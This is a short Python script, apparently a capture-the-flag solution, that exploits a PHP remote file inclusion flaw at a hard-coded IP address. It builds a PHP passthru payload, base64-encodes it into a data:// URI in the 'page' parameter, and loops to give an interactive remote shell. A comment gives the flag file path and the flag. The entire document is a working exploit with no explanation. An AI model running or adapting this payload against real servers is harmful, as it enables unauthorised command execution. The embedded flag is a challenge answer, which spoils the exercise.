from requests import *
import base64 , re

#cat ./3b8a24fe229f7f62e53e1060dca89c6a133f728aa4031f630cb3e59c466d2cb1/3a0436148fef1ad7e3bafaa0259fa99833961abbdc3aaf3e371cc699c1b6314d/f14ggggggggggg
#AD{RF1_Is_v3ry_d4ng3r}

url = 'http://140.115.59.13:8764/index.php'

while True:
    cmd = raw_input('$')
    data = '<?php echo \'ABCD\';echo passthru(\'{}\');echo \'EFGH\';?>'.format(cmd)
    while base64.b64encode(data).find('=') < 0:
        data = data[:-3] + '//' + data[-3:]
    res = get( url + '?page=data://text/plain;base64,' + base64.b64encode(data) )
    print res.content[ res.content.find('ABCD') + 4 : res.content.find('EFGH') ]
